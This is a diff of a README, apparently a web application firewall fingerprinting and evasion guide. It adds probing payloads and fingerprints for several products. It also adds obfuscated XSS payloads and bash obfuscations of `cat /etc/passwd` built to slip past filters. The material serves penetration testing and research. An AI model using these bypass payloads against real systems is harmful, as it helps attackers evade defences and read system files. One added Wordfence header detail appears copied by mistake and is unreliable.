@@ -58,15 +58,18 @@ Feel free to [contribute](CONTRIBUTING.md).
 - Other WAFs reply with unusual response codes upon malicious requests (eg. WebKnight, 360 WAF).
 
 ### Detection Techniques:
+To identify WAFs, we need to (dummy) provoke it.
 1. Make a normal GET request from a browser, intercept and test response headers (specifically cookies).
 2. Make a request from command line (eg. cURL), and test response content and headers (no user-agent included).
-3. If there is a login page somewhere, try some common (easily detectable) payloads like `' or 1 = 1 --`.
+3. If there is a login page somewhere, try some common (easily detectable) payloads like `" or 1 = 1 --`.
 4. If there is some input field somewhere, try with noisy payloads like `<script>alert()</script>`.
-5. Make GET requests with outdated protocols like `HTTP/0.9` (`HTTP/0.9` does not support POST type queries).
-6. Many a times, the WAF varies the `Server` header upon different types of interactions.
-7. Drop Action Technique - Send a raw crafted FIN/RST packet to server and identify response.
+5. Attach a dummy `../../../etc/passwd` to a random parameter at end of URL.
+6. Append some catchy keywords like `' OR SLEEP(5) OR '` at end of URLs to any random parameter.
+6. Make GET requests with outdated protocols like `HTTP/0.9` (`HTTP/0.9` does not support POST type queries).
+7. Many a times, the WAF varies the `Server` header upon different types of interactions.
+8. Drop Action Technique - Send a raw crafted FIN/RST packet to server and identify response.
     > __Tip:__ This method could be easily achieved with tools like [HPing3](http://www.hping.org) or [Scapy](https://scapy.net).
-8. Side Channel Attacks - Examine the timing behaviour of the request and response content. 
+9. Side Channel Attacks - Examine the timing behaviour of the request and response content. 
 
 ## WAF Fingerprints
 Wanna detect WAFs? Lets see how.
@@ -84,7 +87,11 @@ Wanna detect WAFs? Lets see how.
                 <ul>
                     <li>Returns status code <code>493</code> upon unusual requests.</li>
                     <li>On viewing source-code of error page, you will find reference to <code>wzws-waf-cgi/</code> directory.</li>
-                    <li>Source code may contain reference to <code>wangshan.360.cn</code> URL.</li>
+                    <li>Blocked response page source may contain:
+                    <ul>
+                        <li>Reference to <code>wangshan.360.cn</code> URL.</li>
+                        <li><code>Sorry! Your access has been intercepted</code> text snippet.</li>
+                    </ul>
                     <li>Response headers contain <code>X-Powered-By-360WZB</code> Header.</li>
                 </ul>
             </ul>
@@ -638,6 +645,7 @@ Wanna detect WAFs? Lets see how.
                 <ul>
                     <li>Blocked response page content may contain:</li>
                         <ul>
+                            <li><code>Powered By Incapsula</code> text snippet.</li>
                             <li><code>Incapsula incident ID</code> keyword.</li>
                             <li><code>_Incapsula_Resource</code> keyword.</li>
                             <li><code>subject=WAF Block Page</code> keyword.</li>
@@ -1245,7 +1253,7 @@ Wanna detect WAFs? Lets see how.
                 <li><b>Detectability: </b>Easy</li>
                 <li><b>Detection Methodology:</b></li>
                 <ul>
-                    <li>Response headers may contain <code>Sucuri</code> or <code>Cloudproxy</code> values.</li>
+                    <li>Response headers may contain <code>Sucuri</code> or <code>Cloudproxy</code> keywords.</li>
                     <li>Blocked response page contains the following text snippet:</li>
                     <ul>
                         <li><code>Access Denied</code> and <code>Sucuri Website Firewall</code> texts.</li>
@@ -1362,7 +1370,7 @@ Wanna detect WAFs? Lets see how.
                     <li>Response page contains:</li>
                     <ul>
                         <li><code>http://cdn.virusdie.ru/splash/firewallstop.png</code> picture.</li>
-                        <li><code>copy; Virusdie.ru</p></code> text snippet.</li>
+                        <li><code>copy; Virusdie.ru</p></code> copyright notice.</li>
                         <li>Response page title contains <code>Virusdie</code> keyword.</li>
                         <li>Page metadata contains <code>name="FW_BLOCK"</code> keyword</li>
                     </ul>
@@ -1414,6 +1422,27 @@ Wanna detect WAFs? Lets see how.
                         <li><code>AQTRONIX WebKnight</code> text snippet.</li>
                     </ul>
                     <li>Blocked response code returned is <code>999 No Hacking</code>. :p</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            Wordfence (Feedjit)
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Easy</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Response headers contain <code>WebKnight</code> keyword.</li>
+                    <li>Blocked response page contains:</li>
+                    <ul>
+                        <li><code>Generated by Wordfence</code> text snippet.</li>
+                        <li><code>A potentially unsafe operation has been detected in your request to this site</code> text warning.</li>
+                        <li><code>Your access to this site has been limited</code> text warning.</li>
+                        <li><code>This response was generated by Wordfence</code> text snippet.</li>
+                    </ul>
                 </ul>
             </ul>
         </td>
@@ -1658,8 +1687,11 @@ __9. String Concatenation__
 - Different programming languages have different syntaxes and patterns for concatenation.
 - This allows us to effectively generate payloads that can bypass many filters and rules.
 
+__Standard__: `<svg/onload-location=javascript:alert%281%29;//`  
+__Obfuscated__: `<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//`
+
 __Standard__: `/bin/cat /etc/passwd`  
-__Obfuscated__: `/bi'n/c'at' /e'tc'/pa'''ss'wd`
+__Obfuscated__: `/bi'n'''/c''at' /e'tc'/pa'''ss'wd`
 > Bash allows path concatenation for execution.
 
 __Standard__: `<iframe/onload='this["src"]="javascript:alert()"';>`  
@@ -1677,10 +1709,7 @@ __Standard__: `<BODY onload=alert()>`
 __Obfuscated__: ```<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert()>```
 
 __Standard__: `<a href=javascript;alert()>ClickMe `  
-__Bypassed__: 
-```
-<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
-```
+__Bypassed__: `<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe`
 
 __10. Line Breaks__
 - Many WAF with regex based filtering effectively blocks many attempts.
@@ -1690,12 +1719,27 @@ __Standard__: `<iframe src=javascript:alert(0)">`
 __Obfuscated__: `<iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)">`
 
 __11. Uninitialized Variables__
-- Uninitialized bash variables can elude regular expression based filters and pattern match.
+- Uninitialized bash variables can evade bad regular expression based filters and pattern match.
 - Uninitialised variables have value null/they act like empty strings.
 - Both bash and perl allow this kind of interpretations.
 
-__Standard__: `cat /etc/passwd`  
-__Obfuscated__: `cat$u $u/etc$u/passwd$u`
+> __BONUS:__ Variable names can have any number of random characters. I have represented them here as `$aaaaaa`, `$bbbbbb`, and so on. You can replace them with any number of random chars like `$ushdjah` and so on.  ;)
+
+Level 1 Obfuscation: Normal  
+__Standard__: `/bin/cat /etc/passwd`  
+__Obfuscated__: `/bin/cat$u /etc/passwd$u`
+
+Level 2 Obfuscation: Postion Based  
+__Standard__: `/bin/cat /etc/passwd`  
+__Obfuscated__: <code>$u<b>/bin</b>$u<b>/cat</b>$u $u<b>/etc</b>$u<b>/passwd</b>$u</code>
+
+Level 3 Obfuscation: Random chars   
+__Standard__: `/bin/cat /etc/passwd`  
+__Obfuscated__: <code>$aaaaaa<b>/bin</b>$bbbbbb<b>/cat</b>$ccccccc $dddddd<b>/etc</b>$eeeeeee<b>/passwd</b>$fffffff</code>
+
+Level 4 Obfuscation: Wildcard paranoid  
+__Standard__: `/bin/cat /etc/passwd`  
+__Obfuscated__: <code>$aaaaaa<b>/???</b>$bbbbbb<b>/??t</b>$ccccccc $dddddd<b>/???</b>$eeeeeee<b>/??ss??</b>$fffffff</code>
 
 __12. Random Tabs__
 - Tabs often help to evade firewalls especially regex based ones.
@@ -1726,9 +1770,7 @@ Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate
 </pre>
 When the site loads, it will be encoded to the UTF-32 encoding that we set, and
-then as the output encoding of the page is utf-8, it will be rendered as: `"<script>alert (1) </ script>`.
-
-Final URL encoded payload: `%E2%88%80%E3%B8%80%E3%B0%80script%E3%B8%80alert(1)%E3%B0%80/script%E3%B8%80`
+then as the output encoding of the page is UTF-8, it will be rendered as: `<svg/onload=alert()>` which will trigger XSS.
 
 #### Null Bytes:
 - The null bytes are commonly used as string terminator.
@@ -2076,19 +2118,19 @@ User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
 ### Fingerprinting:
 __1. Fingerprinting with [NMap](https://nmap.org)__:  
 Source: [GitHub](https://github.com/nmap/nmap) | [SVN](http://svn.nmap.org)
-- Normal WAF Fingerprinting  
+- Normal WAF fingerprinting  
 `nmap --script=http-waf-fingerprint <target>`
 
-- Intensive WAF Fingerprinting  
+- Intensive WAF fingerprinting  
 `nmap --script=http-waf-fingerprint  --script-args http-waf-fingerprint.intensive=1 <target>`
 
-- Generic Detection  
+- Generic detection  
 ` nmap --script=http-waf-detect <target>`
 
-__2. Fingerprinting with [WafW00f](https://github.com/EnableSecurity/wafw00f)__:  
-Source: [GitHub](https://github.com/enablesecurity/wafw00f) | [Pypi](https://pypi.org/project/wafw00f)
+__2. Fingerprinting with [identYwaf](https://github.com/stamparm/identywaf)__:  
+Source: [GitHub](https://github.com/stamparm/identywaf)
 ```
-wafw00f <target>
+python identYwaf.py --delay=2 --proxy=<proxy> <target>
 ```
 
 ### Testing:
